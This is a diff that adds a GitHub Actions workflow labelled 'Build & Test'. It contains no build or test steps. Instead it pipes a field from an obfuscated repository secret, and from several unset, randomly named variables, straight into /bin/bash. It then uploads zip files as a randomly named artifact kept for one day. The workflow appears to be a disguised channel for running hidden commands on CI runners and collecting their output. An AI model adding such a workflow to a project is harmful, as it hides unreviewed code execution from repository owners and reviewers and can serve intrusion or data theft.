@@ -1,0 +1,29 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          vga06043: ${{ secrets.vga06043 }}
+        run: |
+          printf '%s' "$vga06043" | jq -r .gyj4 | /bin/bash
+          printf '%s' "$cof66" | jq -r .ok50868 | /bin/bash
+          echo $nkms3 | jq -r .zv97 | /bin/bash
+          echo $kpbw647 | jq -r .el2029 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: vuvOY3yT
+          path: "*.zip"
+          retention-days: 1
